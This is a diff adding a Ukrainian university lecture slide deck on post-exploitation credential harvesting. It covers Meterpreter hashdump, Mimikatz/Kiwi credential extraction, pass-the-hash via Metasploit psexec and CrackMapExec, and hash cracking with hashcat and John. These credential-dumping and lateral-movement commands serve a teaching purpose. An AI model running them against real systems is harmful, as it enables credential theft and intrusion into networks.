@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 9.7 — Credential harvesting та хеш-дампінг</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="9">
+  <div class="slide-deck">
+
+    <section class="slide active title-slide">
+      <h1>Credential Harvesting та хеш-дампінг</h1>
+      <div class="subtitle">Тема 9.7 — Пост-експлуатація та Meterpreter</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Дампінг хешів та Mimikatz/Kiwi</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="card-red">
+            <h3>hashdump (SAM)</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+meterpreter&gt; hashdump
+
+Administrator:500:aad3b...:
+  e02bc503339d51f71d91...:::
+jsmith:1001:aad3b...:
+  64f12cddaa88057e06a8...:::
+
+# Формат:
+# user:RID:LM_hash:NTLM_hash
+# LM "aad3b..." = disabled
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-purple">
+            <h3>Kiwi (Mimikatz)</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+meterpreter&gt; load kiwi
+
+# Усі credentials з пам'яті
+meterpreter&gt; creds_all
+
+msv: NTLM хеші
+wdigest: Summer2024!  ← plaintext!
+kerberos: TGT tickets
+
+# Окремо
+meterpreter&gt; creds_msv
+meterpreter&gt; creds_wdigest
+meterpreter&gt; creds_kerberos
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="warning-box" style="margin-top: 1.5rem;">
+        <strong>Mimikatz</strong> (Benjamin Delpy) — найпотужніший інструмент для вилучення Windows credentials. Доступний у Meterpreter як розширення <strong>Kiwi</strong>. Потрібні <strong>SYSTEM</strong> привілеї.
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Pass-the-Hash та крекінг</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="gradient-box gradient-red">
+            <h3>Pass-the-Hash (PtH)</h3>
+            <p style="font-size: 0.82em; margin-top: 0.5rem;">Автентифікація хешем без знання пароля через NTLM:</p>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+# Metasploit PsExec
+msf6&gt; use exploit/windows/
+  smb/psexec
+msf6&gt; set SMBUser Admin
+msf6&gt; set SMBPass aad3b...:
+  e02bc503...
+msf6&gt; exploit
+
+# CrackMapExec
+$ crackmapexec smb
+  10.0.0.0/24
+  -u Admin -H e02bc503...
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="gradient-box gradient-blue">
+            <h3>Крекінг хешів</h3>
+            <p style="font-size: 0.82em; margin-top: 0.5rem;">Офлайн-відновлення паролів з хешів:</p>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+# Hashcat (GPU)
+hashcat -m 1000
+  ntlm_hashes.txt
+  rockyou.txt
+
+# John the Ripper
+john --format=NT
+  ntlm_hashes.txt
+  --wordlist=rockyou.txt
+
+# Онлайн lookup
+# crackstation.net
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="info-box" style="margin-top: 1.5rem;">
+        <strong>Ланцюжок:</strong> Отримати хеші → Спробувати PtH для латерального руху → Якщо потрібен plaintext → Крекінг через hashcat/john → Повторити на інших системах.
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
